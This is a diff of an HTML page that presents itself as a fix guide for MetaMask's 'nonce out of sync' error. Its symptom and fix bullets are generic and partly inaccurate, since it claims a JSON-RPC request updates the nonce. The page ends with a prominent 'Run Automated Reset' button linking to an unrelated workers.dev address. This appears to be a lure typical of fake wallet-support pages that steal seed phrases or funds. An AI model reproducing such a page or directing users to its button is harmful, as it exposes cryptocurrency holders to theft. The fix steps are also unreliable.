@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Nonce Out Of Sync – Fix Guide</title>
 <style>
     body {
-        font-family: -apple-system;
-        background: #0f111a;
+        font-family: system-ui;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff9455; }
     .btn {
-        background: #ff9455;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,18 +42,18 @@
 <h1>Metamask Nonce Out Of Sync</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter an error message indicating that their MetaMask nonce is out of sync, preventing them from completing transactions on the Ethereum network. This issue is often accompanied by failed transaction attempts and warnings about nonce mismatches.</li>
+<li>Users encounter an error message stating "MetaMask nonce out of sync" when attempting to send transactions or interact with Ethereum-based applications, indicating a discrepancy between the expected and actual nonce values.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a mismatch between the expected transaction nonce stored in MetaMask and the actual nonce recorded on the Ethereum blockchain. This discrepancy can arise from various factors, including interrupted transactions, concurrent transaction submissions, or incorrect manual nonce adjustments.</li>
+<li>The error occurs due to a mismatch between the nonce value stored in MetaMask and the actual nonce value on the Ethereum blockchain, often resulting from cancelled or pending transactions that have not been properly accounted for.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the nonce mismatch, users can attempt the following steps:</li>
-<li>Reset the MetaMask account to resynchronize the nonce with the blockchain state.</li>
-<li>Manually adjust the nonce in the transaction settings to match the expected nonce on the blockchain.</li>
-<li>Utilize the following JSON-RPC command to fetch the current account nonce and update MetaMask accordingly:</li>
+<li>Reset the account in MetaMask to resync the nonce value:</li>
+<li>Update the MetaMask settings to automatically resync the nonce</li>
+<li>Use the <code>eth_getTransactionCount</code> RPC method to retrieve the current nonce value</li>
+<li>Utilize the following JSON-RPC request to update the nonce:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
 <span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
@@ -63,14 +63,14 @@
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider using an external Ethereum console for more advanced debugging and nonce management.</p>
+<p>Consider using an external console to execute these commands for more flexibility.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>MetaMask extension installed and configured.</li>
-<li>Ethereum account with a sufficient balance for transaction fees.</li>
-<li>Stable internet connection for blockchain synchronization.</li>
+<li>MetaMask extension installed and configured</li>
+<li>Ethereum account with sufficient balance</li>
+<li>Access to a JSON-RPC compatible Ethereum node or provider</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-swap-and-bridge-fail-on-arbitrum-network.html">Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sign-message-clicking-back-button-in-the.html">Metamask Extension Bug Sign Message Clicking Back Button In The</a></li><li><a href="./archive/2026/06/metamask-extension-bug-incorrect-balance-for-aave-v3-wavax-toke.html">Metamask Extension Bug Incorrect Balance For Aave V3 Wavax Token</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-swap-and-bridge-fail-on-arbitrum-network.html">Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-native-assets-for-custom-networks.html">Metamask Extension Bug Assets Native Assets For Custom Networks</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-miss-match-between-network-picker.html">Metamask Extension Bug Assets Miss Match Between Network Picker</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
